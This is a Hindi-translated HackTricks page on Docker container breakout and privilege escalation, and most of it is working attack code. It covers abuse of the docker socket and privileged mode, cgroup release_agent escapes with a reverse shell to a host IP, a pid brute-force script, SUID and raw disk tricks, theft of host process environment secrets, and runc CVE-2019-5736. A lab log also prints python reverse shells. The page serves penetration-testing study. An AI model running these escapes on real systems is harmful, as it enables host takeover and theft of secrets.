# Docker Breakout / विशेषाधिकार उन्नति

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर हमें **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) का उपयोग करें और आसानी से बिल्ड और **स्वचालित कार्यप्रणालियाँ** बनाएं जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित हों।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## स्वचालित गणना और भागना

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): यह **कंटेनरों की गणना** भी कर सकता है
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): यह उपकरण खास रूप से **उस कंटेनर की गणना करने के लिए उपयोगी है जिसमें आप हैं और स्वचालित रूप से भागने की कोशिश कर सकते हैं**
* [**amicontained**](https://github.com/genuinetools/amicontained): कंटेनर के द्वारा दी गई प्रिविलेज को प्राप्त करने के लिए उपयोगी उपकरण ताकि इससे भागने के तरीके ढूंढ़ सकें
* [**deepce**](https://github.com/stealthcopter/deepce): कंटेनरों से गणना और भागने के लिए उपकरण
* [**grype**](https://github.com/anchore/grype): छवि में स्थापित सॉफ्टवेयर में शामिल CVEs प्राप्त करें

## माउंट किया गया डॉकर सॉकेट भागना

यदि किसी प्रकार से आपको लगता है कि **डॉकर सॉकेट** डॉकर कंटेनर के अंदर माउंट किया गया है, तो आप इससे भाग सकेंगे।\
यह आम तौर पर उन डॉकर कंटेनरों में होता है जो किसी कारणवश डॉकर डेमन से कनेक्ट करने की आवश्यकता होती है ताकि कार्रवाई कर सकें।
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
इस मामले में आप सामान्य docker कमांड्स का उपयोग करके docker डेमन के साथ संचार कर सकते हैं:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
यदि **डॉकर सॉकेट अपेक्षित स्थान पर है** तो आप इसके साथ अभी भी **`docker`** कमांड का उपयोग करके संवाद कर सकते हैं पैरामीटर के साथ **`-H unix:///path/to/docker.sock`**
{% endhint %}

डॉकर डेमन एक पोर्ट में भी हो सकता है (डिफ़ॉल्ट रूप से 2375, 2376) या सिस्टमडी-आधारित सिस्टमों पर, डॉकर डेमन के साथ संवाद `fd://` के माध्यम से हो सकता है।

{% hint style="info" %}
इसके अतिरिक्त, अन्य उच्च स्तरीय रनटाइम के सॉकेट की रनटाइम सूची पर ध्यान दें:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## क्षमताएँ दुरुपयोग भागना

आपको कंटेनर की क्षमताओं की जांच करनी चाहिए, यदि इसमें निम्नलिखित में से कोई है, तो आप इससे बचने के लिए सक्षम हो सकते हैं: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

आप **पहले से उल्लिखित स्वचालित उपकरणों** या का उपयोग करके वर्तमान में कंटेनर क्षमताएँ जांच सकते हैं:
```bash
capsh --print
```
## विशेषाधिकार से बाहर निकलें

एक विशेषाधिकृत कंटेनर `--privileged` फ्लैग के साथ बनाया जा सकता है या विशेष रक्षाओं को अक्षम करके:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `/dev` माउंट करें

`--privileged` फ्लैग कंटेनर सुरक्षा को काफी कम कर देता है, **असीमित डिवाइस एक्सेस** प्रदान करता है और **कई सुरक्षा उपायों** को छलने देता है। विस्तृत विश्लेषण के लिए, `--privileged` के पूरे प्रभाव पर दस्तावेज़ीकरण देखें।
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### विशेषाधिकार

केवल विशेषाधिकार ध्वज के साथ आप **होस्ट की डिस्क तक पहुंचने** की कोशिश कर सकते हैं या **रिलीज़_एजेंट या अन्य भागों का दुरुपयोग करके बच निकलने** की कोशिश कर सकते हैं।

निम्नलिखित उल्टियों का परीक्षण करें जो एक कंटेनर में निष्पादित हो रहा है:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### डिस्क माउंट करना - Poc1

अच्छी तरह से कॉन्फ़िगर किए गए डॉकर कंटेनर **fdisk -l** जैसे कमांड को नहीं चलने देगा। हालांकि, जब `--privileged` या `--device=/dev/sda1` फ्लैग के साथ बूट किया जाता है, तो यह संभावना है कि आपको मेज़बान ड्राइव देखने के लिए विशेषाधिकार मिल सकते हैं।

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

इसलिए मेज़बान मशीन पर कब्ज़ा करना बहुत आसान है:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
और देखो! अब आप मेज़बान के फ़ाइल सिस्टम तक पहुँच सकते हैं क्योंकि यह `/mnt/hola` फ़ोल्डर माउंट किया गया है।

#### डिस्क माउंट करना - Poc2

कंटेनर के भीतर, एक हमलावर होस्ट ओएस तक और पहुँच प्राप्त करने का प्रयास कर सकता है जिसे क्लस्टर द्वारा बनाए गए एक लिखने योग्य होस्टपैथ वॉल्यूम माउंट किया गया है। नीचे कुछ सामान्य चीजें हैं जिन्हें आप कंटेनर के भीतर जांच सकते हैं ताकि आप इस हमलावर वेक्टर का उपयोग कर सकें:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### विशेषाधिकार भाग अस्तित्व में release\_agent का दुरुपयोग ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="प्रारंभिक PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### विशेषाधिकार भागना बनाए गए रिलीज़_एजेंट का दुरुपयोग ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="दूसरा PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

**तकनीक की व्याख्या** खोजें:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### विशेषाधिकार भागना release\_agent का दुरुपयोग करते हुए बिना जाने संबंधित पथ - PoC3

पिछले उत्पीड़नों में **मेज़बान फ़ाइल सिस्टम में कंटेनर का पूर्ण पथ उजागर किया गया है**। हालांकि, यह हमेशा ऐसा नहीं होता। उन मामलों में जहां आप **मेज़बान में कंटेनर का पूर्ण पथ नहीं जानते** हैं, आप इस तकनीक का उपयोग कर सकते हैं:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
किसी विशेषाधिकार वाले कंटेनर के भीतर PoC को क्रियान्वित करने से निम्नलिखित के समान आउटपुट प्राप्त होना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### विशेषाधिकारिक भाग गंभीर माउंट का दुरुपयोग

कई फ़ाइलें हो सकती हैं जो माउंट की गई हों जो **मेज़बान होस्ट के बारे में जानकारी** देती हैं। इनमें से कुछ ऐसी भी हो सकती हैं जो **कुछ होने पर मेज़बान द्वारा कुछ निष्पादित करने की संकेत देती हैं** (जिससे हमलावर को कंटेनर से बाहर निकलने की अनुमति मिल सकती है)।\
इन फ़ाइलों का दुरुपयोग यह संभव बना सकता है कि:

* release\_agent (पहले से ही शामिल किया गया है)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

हालांकि, आप इस पृष्ठ में **अन्य संवेदनशील फ़ाइलें** भी जांचने के लिए खोज सकते हैं:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### मनमानी माउंट

कई अवसरों में आपको यह मिलेगा कि **कंटेनर में मेज़बान होस्ट से कुछ वॉल्यूम माउंट किया गया है**। यदि यह वॉल्यूम सही ढंग से कॉन्फ़िगर नहीं किया गया है तो आप **संवेदनशील डेटा तक पहुंचने/संशोधित करने** की सक्षम हो सकते हैं: रहस्य पढ़ें, एसएसएच अधिकृत\_कुंजियाँ बदलें...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 शैल्स और होस्ट माउंट के साथ विशेषाधिकार उन्नति

यदि आपके पास **कंटेनर के अंदर रूट के रूप में पहुंच** है जिसमें **होस्ट से कुछ फोल्डर माउंट किया गया है** और आपने **गैर-विशेषाधिकृत उपयोगकर्ता के रूप में होस्ट पर बच निकला** है और माउंट किए गए फोल्डर पर पढ़ने की पहुंच है।\
आप **कंटेनर** के अंदर **माउंट किए गए फोल्डर** में **एक बैश suid फ़ाइल** बना सकते हैं और **होस्ट** से इसे निषेधाधिकार के लिए निष्पादित कर सकते हैं।
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 शैल्स के साथ विशेषाधिकार उन्नति

यदि आपके पास **कंटेनर के अंदर रूट के रूप में पहुंच** है और आप **गैर-विशेषाधिकृत उपयोगकर्ता के रूप में होस्ट में बाहर निकल गए** हैं, तो आप दोनों शैल्स का दुरुपयोग करके **होस्ट के अंदर विशेषाधिकार उन्नति** कर सकते हैं यदि आपके पास कंटेनर के अंदर MKNOD क्षमता है (यह डिफ़ॉल्ट रूप से है) जैसा कि [**इस पोस्ट में स्पष्ट किया गया है**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)।\
इस प्रकार की क्षमता के साथ, कंटेनर के अंदर रूट उपयोगकर्ता को **ब्लॉक उपकरण फ़ाइलें बनाने की अनुमति** है। उपकरण फ़ाइलें विशेष फ़ाइलें हैं जो **अंतर्निहित हार्डवेयर और कर्नेल मॉड्यूल तक पहुंचने** के लिए उपयोग की जाती हैं। उदाहरण के लिए, /dev/sda ब्लॉक उपकरण फ़ाइल सिस्टम डिस्क पर **रॉ डेटा पढ़ने की पहुंच** प्रदान करती है।

डॉकर कंटेनर किसी भी ब्लॉक उपकरण के दुरुपयोग के खिलाफ सुरक्षित रखने के लिए एक cgroup नीति को लागू करके **ब्लॉक उपकरण पढ़ने/लिखने के कार्यों को रोकता है**। फिर भी, यदि कंटेनर के अंदर एक ब्लॉक उपकरण **बनाया जाता है**, तो यह कंटेनर के बाहर से **/proc/PID/root/** निर्देशिका के माध्यम से पहुंचने योग्य हो जाता है। इस पहुंच के लिए आवश्यक है कि **प्रक्रिया के मालिक दोनों कंटेनर के अंदर और बाहर समान हों**।

इस [**लेखन**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) से **शोषण** उदाहरण:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

यदि आप मेज़बान के प्रक्रियाओं तक पहुंच सकते हैं तो आप उन प्रक्रियाओं में संग्रहित कई संवेदनशील जानकारी तक पहुंच सकेंगे। टेस्ट लैब चलाएँ:
```
docker run --rm -it --pid=host ubuntu bash
```
उदाहरण के लिए, आप कुछ इस प्रकार से `ps auxn` का उपयोग करके प्रक्रियाएँ सूचीबद्ध कर सकेंगे और कमांड में संवेदनशील विवरणों की खोज कर सकते हैं।

फिर, जैसे ही आप **/proc/ में मेजबान की प्रत्येक प्रक्रिया तक पहुंच सकते हैं, आप उनके env गुप्त चीजें चुरा सकते हैं** चलाकर:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
आप भी **अन्य प्रक्रियाओं के फ़ाइल डिस्क्रिप्टर्स तक पहुँच सकते हैं और उनकी ओपन फ़ाइल्स को पढ़ सकते हैं**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
आप भी **प्रक्रियाओं को मार सकते हैं और डीओएस का कारण बना सकते हैं**।

{% hint style="warning" %}
यदि आपके पास किसी कंटेनर के बाहर की प्रक्रिया पर विशेषाधिकार है, तो आप `nsenter --target <pid> --all` या `nsenter --target <pid> --mount --net --pid --cgroup` जैसी कुछ चला सकते हैं ताकि आप **उस प्रक्रिया के साथ समान ns प्रतिबंधों** (आशा है कोई नहीं) **वाला शैल चला सकें।**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
यदि एक कंटेनर को डॉकर [होस्ट नेटवर्किंग ड्राइवर (`--network=host`)](https://docs.docker.com/network/host/) के साथ कॉन्फ़िगर किया गया था, तो उस कंटेनर का नेटवर्क स्टैक डॉकर होस्ट से अलग नहीं है (कंटेनर होस्ट के नेटवर्किंग नेमस्पेस को साझा करता है), और कंटेनर को अपना आईपी-पता आवंटित नहीं किया जाता है। दूसरे शब्दों में, **कंटेनर सभी सेवाएं सीधे होस्ट के आईपी पर बाइंड करता है**। इसके अतिरिक्त, कंटेनर **होस्ट** द्वारा भेजे और प्राप्त कर रहा है सभी नेटवर्क ट्रैफ़िक को **अंतर्ग्रहण कर सकता है जो साझा इंटरफेस पर है `tcpdump -i eth0`।

उदाहरण के रूप में, आप इसका उपयोग करके **होस्ट और मेटाडेटा इंस्टेंस के बीच ट्रैफ़िक को स्निफ़ और स्पूफ़** कर सकते हैं।

जैसे निम्नलिखित उदाहरणों में:

* [लेख: Google SRE से संपर्क कैसे करें: क्लाउड SQL में शैल डालना](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [मेटाडेटा सेवा MITM द्वारा रूट प्रिविलेज उन्नति (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

आपको यहां तक पहुंचने की अनुमति भी होगी **होस्ट के अंदर लोकलहोस्ट पर बाइंड नेटवर्क सेवाओं** तक या फिर **नोड की मेटाडेटा अनुमतियों** तक (जो एक कंटेनर तक पहुंच सकती है)।

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
जब `hostIPC=true` होता है, तो आपको मेज़बान के इंटर-प्रोसेस कम्यूनिकेशन (IPC) संसाधनों तक पहुंच मिलती है, जैसे कि **साझा स्मृति** `/dev/shm` में। इससे यह संभव हो जाता है कि आप उन्हीं IPC संसाधनों पर पढ़ने/लिखने की अनुमति प्राप्त करें जो अन्य मेज़बान या पॉड प्रक्रियाओं द्वारा उपयोग किए जा रहे हों। `ipcs` का उपयोग करके इन IPC तंत्रों की अध्ययन करें।

* **/dev/shm की जांच** - इस साझा स्मृति स्थान में किसी भी फ़ाइल की खोज करें: `ls -la /dev/shm`
* **मौजूदा IPC सुविधाओं की जांच** - आप `/usr/bin/ipcs` का उपयोग करके देख सकते हैं कि क्या कोई IPC सुविधाएँ उपयोग की जा रही हैं। इसे इस प्रकार जांचें: `ipcs -a`

### क्षमताएँ पुनः प्राप्त करें

यदि सिस्कॉल **`unshare`** को निषेधित नहीं किया गया है तो आप सभी क्षमताएँ पुनः प्राप्त कर सकते हैं:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### सिम्लिंक के माध्यम से उपयोगकर्ता नेमस्पेस दुरुपयोग

पोस्ट [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) में स्पष्ट किया गया दूसरा तकनीकी तरीका दिखाता है कि आप यूजर नेमस्पेस के साथ बाइंड माउंट का दुरुपयोग कैसे कर सकते हैं, ताकि मेजबान के अंदर के फ़ाइलों पर प्रभाव डाल सकें (उस विशिष्ट मामले में, फ़ाइलें हटा सकते हैं)।

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) का उपयोग करें और आसानी से **वर्कफ़्लो** को बनाएं और **स्वचालित** करें जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित होता है।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## CVEs

### Runc शात्रुता (CVE-2019-5736)

यदि आप `docker exec` को रूट के रूप में निष्पादित कर सकते हैं (संभावित रूप से sudo के साथ), तो आप CVE-2019-5736 का दुरुपयोग करके निकल सकते हैं (यहां दुरुपयोग [यहां](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go) है)। यह तकनीक बुनियादी रूप से **/bin/sh** बाइनरी को **मेजबान** से **कंटेनर** में अधिलेखित कर देगी, ताकि कोई भी docker exec को चलाने वाला पेलोड ट्रिगर कर सके।

पेलोड को अनुसार बदलें और `go build main.go` के साथ main.go को बनाएं। परिणामी बाइनरी को कंटेनर में निष्पादन के लिए रखा जाना चाहिए।\
निष्पादन के दौरान, जैसे ही यह `[+] Overwritten /bin/sh successfully` प्रदर्शित करता है, आपको मेजबान मशीन से निम्नलिखित को निष्पादित करना होगा:

`docker exec -it <container-name> /bin/sh`

यह पेलोड को ट्रिगर करेगा जो मुख्य.go फ़ाइल में मौजूद है।

अधिक जानकारी के लिए: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
कंटेनर को अनुरक्षित करने वाली अन्य CVEs हो सकती हैं, आप [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) में सूची पा सकते हैं।
{% endhint %}

## Docker Custom Escape

### Docker Escape Surface

* **नेमस्पेस:** प्रक्रिया को नेमस्पेस के माध्यम से **पूरी तरह से अलग** रखा जाना चाहिए, ताकि हम नेमस्पेस के कारण अन्य प्रक्रियाओं के साथ बातचीत से बच सकें (डिफ़ॉल्ट रूप से IPCs, यूनिक्स सॉकेट, नेटवर्क सेवाएं, D-Bus, अन्य प्रक्रियाओं के `/proc` के माध्यम से संवाद नहीं कर सकते)।
* **रूट उपयोगकर्ता:** डिफ़ॉल्ट रूप से प्रक्रिया चलाने वाला उपयोगकर्ता रूट उपयोगकर्ता है (हालांकि इसकी विशेषाधिकारिता सीमित है)।
* **क्षमताएँ:** Docker निम्नलिखित क्षमताएँ छोड़ता है: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **सिसकॉल्स:** ये सिसकॉल्स हैं जिन्हें **रूट उपयोगकर्ता कॉल नहीं कर सकेगा** (क्षमताओं की कमी + Seccomp के कारण)। बचे हुए सिसकॉल्स का प्रयास करने के लिए उपयोग किया जा सकता है।

{% tabs %}
{% tab title="x64 सिसकॉल्स" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% टैब शीर्षक="arm64 सिसकॉल्स" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
